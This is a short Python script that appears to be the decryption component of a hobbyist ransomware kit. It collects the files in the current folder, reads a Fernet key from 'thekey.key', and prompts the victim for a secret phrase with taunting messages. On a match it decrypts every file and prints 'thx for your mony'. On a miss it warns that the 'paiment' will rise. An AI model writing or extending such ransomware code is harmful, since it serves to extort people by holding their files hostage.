import os

from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "v.py" or file == "thekey.key" or file == "sol.py":
        continue
    if os.path.isfile(file):
        files.append(file)

with open("thekey.key","rb") as key:
    skey=key.read()

sph=''

user_input=input('entre the s key AHAHAHAHA\n')


if user_input == sph:
    for file in files:
        with open(file,"rb") as thefile:
            content = thefile.read()
        content_decrypted = Fernet(skey).decrypt(content)
        with open(file,"wb") as thefile:
            thefile.write(content_decrypted)
        print('thx for your mony')
else:
    print("wrong HHOHOHOHOOHOH NOW THE PAIMENT RISE")